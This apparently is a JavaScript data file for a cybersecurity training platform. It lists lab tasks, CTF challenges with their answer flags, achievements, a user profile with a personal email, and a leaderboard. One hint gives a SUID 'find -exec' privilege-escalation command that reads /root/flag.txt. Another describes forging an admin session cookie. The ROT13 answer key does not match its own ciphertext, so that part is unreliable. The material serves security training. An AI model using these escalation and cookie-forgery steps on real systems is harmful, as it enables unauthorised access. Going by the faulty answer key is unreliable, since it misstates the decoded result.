        id: "lab-suid-t2",
        title: "Capture Root Flag",
        question: "Leverage find's exec parameter to read the root flag at /root/flag.txt:",
        hint: "Run '/usr/bin/find . -exec cat /root/flag.txt \\; -quit' or escape via find shell exec.",
        flag: "THM{suid_priv_esc_conquered_448}",
        xp: 200
      }
    ]
  },
  {
    id: "lab-wireshark-pcap",
    title: "Wireshark Packet Analysis",
    description: "Analyze packet capture streams to reconstruct plaintext TCP sessions and harvest login credentials.",
    difficulty: "Beginner",
    duration: "20 mins",
    xpReward: 200,
    category: "Network Defense",
    targetIp: "Local capture.pcap",
    vulnerableServices: ["PCAP Analysis", "Unencrypted FTP Transmission"],
    instructions: `### Lab Objective
In this lab, you are a network security analyst. You have been provided a packet capture \`capture.pcap\` recorded from a core gateway switch. An administrator used unencrypted FTP to transfer sensitive configurations.

#### Tasks:
1. Inspect TCP flow packets inside Wireshark.
2. Extract plaintext username and password structures transmitted in FTP commands.
3. Locate the flag hidden inside the file transfer data packets.

#### Wireshark Filter Guidelines:
- Filter FTP packets: \`ftp\`
- Filter FTP file transfers: \`ftp-data\`
- Follow TCP Stream: Right-click any packet and select **Follow -> TCP Stream** to reconstruct conversations in plaintext.`,
    tasks: [
      {
        id: "lab-wireshark-t1",
        title: "Recover Plaintext FTP Credentials",
        question: "What was the administrator's password transmitted in the unencrypted FTP flow?",
        hint: "Filter packets by 'ftp' and search for 'PASS' parameter values or follow the TCP stream.",
        flag: "nexus_ftp_fallback_901",
        xp: 100
      },
      {
        id: "lab-wireshark-t2",
        title: "Recover Secret Configuration Flag",
        question: "What is the flag found inside the transferred backup file?",
        hint: "Filter by 'ftp-data' or look for the file transfer bytes containing the flag format.",
        flag: "THM{wireshark_cleartext_cred_harvest_21}",
        xp: 100
      }
    ]
  }
];

export const ALL_CTFS = [
  {
    id: 'ctf-web-cookies',
    title: 'Cookie Monster',
    description: 'Inspect user authorization tokens. Locate the encoded session token, identify its encoding scheme, and bypass auth checks to claim the admin flag.',
    category: 'Web',
    difficulty: 'Beginner',
    points: 100,
    hint: 'The session cookie "user_session" is Base64 encoded. Can you decode it and change "role:guest" to "role:admin"?',
    flag: "FLAG{b64_c00k1e_m0nst3r_e4t}",
    solvedCount: 1421,
    creator: 'CookieShep'
  },
  {
    id: 'ctf-crypto-rot13',
    title: 'Caesar\'s ROT13 Challenge',
    description: 'An ancient general encrypts his communications. Rotate alphabet indexes by 13 positions to read the flag: "PBBERPG_PLESRE_CEBG_flag_is_N0_S0_S3PH1_PYSB"',
    category: 'Cryptography',
    difficulty: 'Beginner',
    points: 150,
    hint: 'A simple rotational cipher where letters shift by 13 spaces. ROT13 is symmetrical, so rot13(rot13(text)) returns the original!',
    flag: "FLAG{CORRECT_CIPHER_PROT_flag_is_A0_F0_F3CS1_CLFE}",
    solvedCount: 893,
    creator: 'CaesarHacker'
  },
  {
    id: 'ctf-foren-log',
    title: 'SIEM Intrusion Analysis',
    description: 'A suspicious port scan was traced in the server records. Find the source IP of the scan and submit it wrapped in standard flag container: FLAG{IP_ADDRESS}',
    category: 'Forensics',
    difficulty: 'Intermediate',
    points: 200,
    hint: 'Examine logs for massive port access attempts in seconds from an external subnet. Look for IPs like 198.51.100.99',
    flag: "FLAG{198.51.100.99}",
    solvedCount: 512,
    creator: 'BlueDef_Agent'
  },
  {
    id: 'ctf-rev-assembly',
    title: 'Reverse Code Assembly',
    description: 'Read the following simple assembly function. Determine what integer must be entered in register EAX to make the comparison jump to the successful win condition. Win conditional holds if EAX + 0x24 = 0x88.',
    category: 'Reverse Engineering',
    difficulty: 'Advanced',
    points: 250,
    hint: 'In hex, 0x88 = 136, and 0x24 = 36. If EAX + 36 = 136, what is EAX in decimal?',
    flag: "FLAG{100}",
    solvedCount: 184,
    creator: 'RE_Ghost'
  }
];

export const ALL_ACHIEVEMENTS = [
  {
    id: 'ach-first-blood',
    title: 'First Blood',
    description: 'Successfully complete your first cybersecurity practical task.',
    icon: 'Sword',
    xpReward: 50,
    category: 'general'
  },
  {
    id: 'ach-script-kiddie',
    title: 'Script Kiddie',
    description: 'Accumulate a total of 250 XP across the platform.',
    icon: 'Zap',
    xpReward: 100,
    category: 'general'
  },
  {
    id: 'ach-port-explorer',
    title: 'Port Explorer',
    description: 'Successfully solve the host port scanning lab.',
    icon: 'Radar',
    xpReward: 150,
    category: 'lab'
  },
  {
    id: 'ach-ctf-champion',
    title: 'Flag Hunter',
    description: 'Submit a correct flag and solve a CTF challenge.',
    icon: 'Flag',
    xpReward: 200,
    category: 'ctf'
  },
  {
    id: 'ach-certified-pro',
    title: 'Certified Pentester',
    description: 'Earn a CyberNexus course completion certificate.',
    icon: 'Award',
    xpReward: 300,
    category: 'course'
  }
];

export const INITIAL_PROFILE = {
  username: 'yassinekalthoum94',
  email: 'yassinekalthoum94@gmail.com',
  age: 28,
  location: 'Paris, France',
  gender: 'Man',
  role: 'Admin',
  level: 15,
  xp: 8500,
  streak: 12,
  lastActiveDate: '2026-07-30',
  completedLessons: ['intro_cyber', 'sql_injection'],
  completedLabs: ['sql_injection_basics'],
  solvedCtfs: ['sqli_bypass'],
  unlockedAchievements: ['ach-first-blood', 'ach-certified-pro'],
  savedNotes: {}
};

export const MOCK_LEADERBOARD = [
  { rank: 1, username: 'yassinekalthoum94', level: 15, xp: 8500, solvedCtfsCount: 10, completedLabsCount: 15, role: 'Admin', avatarColor: 'bg-purple-500' },
  { rank: 2, username: 'hax0r_god', level: 14, xp: 5420, solvedCtfsCount: 8, completedLabsCount: 12, role: 'Student', avatarColor: 'bg-red-500' },
  { rank: 3, username: 'null_pointer', level: 12, xp: 4210, solvedCtfsCount: 6, completedLabsCount: 10, role: 'Student', avatarColor: 'bg-indigo-500' },
  { rank: 4, username: 'cyber_shepherd', level: 9, xp: 3100, solvedCtfsCount: 5, completedLabsCount: 7, role: 'Instructor', avatarColor: 'bg-emerald-500' },
  { rank: 5, username: 'security_first', level: 7, xp: 2200, solvedCtfsCount: 4, completedLabsCount: 5, role: 'Student', avatarColor: 'bg-amber-500' },
  { rank: 6, username: 'buffer_overflow', level: 5, xp: 1450, solvedCtfsCount: 2, completedLabsCount: 4, role: 'Student', avatarColor: 'bg-pink-500' },
  { rank: 7, username: 'packet_sniffer', level: 4, xp: 1120, solvedCtfsCount: 1, completedLabsCount: 3, role: 'Student', avatarColor: 'bg-purple-500' }
];